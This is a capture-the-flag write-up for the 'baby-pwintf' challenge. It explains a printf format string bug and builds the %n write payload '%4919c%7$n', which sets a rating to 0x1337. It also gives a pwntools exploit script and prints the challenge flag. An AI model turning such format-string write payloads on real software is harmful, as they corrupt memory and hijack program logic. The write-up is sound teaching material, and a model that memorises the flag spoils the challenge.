# baby-pwintf

## Challenge

The program has some similarities to a previous challenge, "echowo".
It asks the user for their name, then repeats it using `printf`.

This challenge is different as the flag is no longer stored in memory during normal execution.
This means we can't use the same trick as last time by printing the flag from the stack.

After the server repeats our name, it rates it out of 10.
If we get a rating of 0x1337, the server will print the flag:

```c
printf("I rate your name %d / 10\n", *rating);

if (*rating == 0x1337) {
    puts("Nice name! here's a flag:");
    win();
}
```

However, this is not possible during normal execution,
as the rating generated is in the range [0, 10]:

```c
*rating = input[0] % 11;
```

## Solution

This challenge contains the same format string vulnerability as "echowo".

If we could change the value stored at `rating` to 0x1337, the program would print the flag.

Let's look at a less common format specifier for `printf`:

```
n      The number of characters written so far is stored into the
       integer pointed to by the corresponding argument.  That
       argument shall be an int *, or variant whose size matches
       the (optionally) supplied integer length modifier.  No
       argument is converted.  (This specifier is not supported
       by the bionic C library.)  The behavior is undefined if
       the conversion specification includes any flags, a field
       width, or a precision.
```

Using `%n`, we can write the number of characters written so far at an address if we have a pointer.
Fortunately, `rating` is a pointer to the value we want to change and it is stored on the stack.
It can be accessed just like the char pointer in "echowo", except this time we will use `%n` to
overwrite the value at the address.

Unfortunately, we can't just write 0x1337 characters in front, because our input buffer is only 16
bytes long.
Again, we will consult the `printf` man page:

```
The overall syntax of a conversion specification is:

    %[$][flags][width][.precision][length modifier]conversion

...

Field width
    An optional decimal digit string (with nonzero first digit)
    specifying a minimum field width.
```

So if we wrote something like `%10c`, it would print the character specified by an argument,
padded to a minimum length of 10 characters.
For our exploit, instead of printing 0x1337 characters ourselves,
we can use `%4919c` which will expand to 0x1337 characters.

Using the same technique as in "echowo", we can find the offset to `rating`,
which in this case is also the 7th argument.
One leading element will be consumed by the padded character to give us the correct length.
The other elements, we can skip using `%c` and subtract the length by the number of characters skipped,
but this would make our payload exceed the limit of 15 characters.

Instead, we can access the 7th argument using the '$' style format specifier:

```
One can also specify explicitly which argument is taken,
at each place where an argument is required, by writing "%m$"
instead of '%' and "*m$" instead of '*', where the decimal
integer m denotes the position in the argument list of the
desired argument, indexed starting from 1.
```

The 7th element can be written to using `%7$n`.

Thus, our final payload looks like this: `%4919c%7$n`.

This will print 4919 characters, then write that same number into the address pointed at by the
7th argument.
This value is equal to 0x1337, which will cause the program to print the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1445 baby-pwintf
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('baby-pwintf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1445)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(b"Tell me your name and I'll rate it!", "%{}c%7$n".format(0x1337).encode())

io.interactive()
```

## Flag

```
maple{youwe_weady_fow_the_big_boy_chawwenge}
```
